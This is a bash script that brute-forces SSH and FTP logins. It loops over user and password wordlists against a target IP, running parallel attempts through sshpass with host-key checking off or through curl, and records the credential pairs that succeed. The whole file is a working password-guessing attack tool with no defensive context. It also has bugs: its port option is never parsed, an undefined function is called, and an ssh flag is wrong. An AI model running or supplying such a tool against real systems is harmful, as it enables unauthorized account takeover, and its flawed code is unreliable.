#! /bin/bash

error() {
    echo "Usage :$0 -t <target> -u <wordlist-users> -p <pass-wordlist> -T <threads> -s <service> [-P <port> -o <Output file> ]"
    exit 1
    echo "Example : $0 -t 192.159.11.2 -p pass.txt - u user.txt -T 30 -s ssh -P 22 -o hh.txt"
}

while getopts "t:u:T:p:o:s:" opt; do
    case $opt in

        t ) TARGET=$OPTARG ;;
        u) USERLIST=$OPTARG ;;
        p) PASSLIST=$OPTARG ;;
        T) THREADS=$OPTARG ;;
        s) SERVICE=$OPTARG ;;
        P) PORT=$OPTARG ;;
        o) OUTPUT_FILE=$OPTARG ;;
        *) usage ;;

    esac

done


if [ -z "$TARGET" ] || [ -z "$USERLIST" ] || [ -z "$PASSLIST" ] || [ -z "$THREADS" ] || [ -z "$SERVICE" ]; then
    error
fi

if [ -n "$OUTPUT_FILE" ]; then
    : > "$OUTPUT_FILE"
fi


if [ -z "$PORT" ]; then
    if [ "$SERVICE" == "ssh" ]; then
        PORT=22
    elif [ "$SERVICE" == "ftp" ]; then
        PORT=21
    else
        echo "Unsupported service: $SERVICE. Only 'ssh' and 'ftp' are supported."
        exit 1
    fi
fi

ssh_brute() {
    local user=$1
    local pass=$2
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$TARGET" -P $PORT     exit 2>/dev/null
      if [ $? -eq 0 ]; then
        echo "Success: $user:$pass" >> "$OUTPUT_FILE"
        echo "Success: $user:$pass"
    fi
}


ftp_brute() {
    local user=$1
    local pass=$2
    curl -s --ftp-ssl -u "$user:$pass" "ftp://$TARGET:$PORT/" >/dev/null
            if [ $? -eq 0 ]; then
        echo "Success: $user:$pass" >> "$OUTPUT_FILE"
        echo "Success: $user:$pass"
    fi

}

echo "Starting brute force"
echo "Target: $TARGET"
echo "Userlist: $USERLIST"
echo "Passlist: $PASSLIST"
echo "Threads: $THREADS"
echo "Service: $SERVICE"
echo "Port: $PORT"



users=($(cat "$USERLIST"))
passwords=($(cat "$PASSLIST"))


for i in  "${users[@]}"; do
    for j in "${passwords[@]}"; do
        while [ "$(jobs | wc -l)" -ge "$THREADS" ]; do
            sleep 0.0001
            done

        if [ "$SERVICE" == "ssh" ]; then
            ssh_brute "$i" "$j" &
        elif [ "$SERVICE" == "ftp" ]; then
            ftp_brute "$i" "$j" &
        fi
    done
done

wait

echo "Brute force is done"



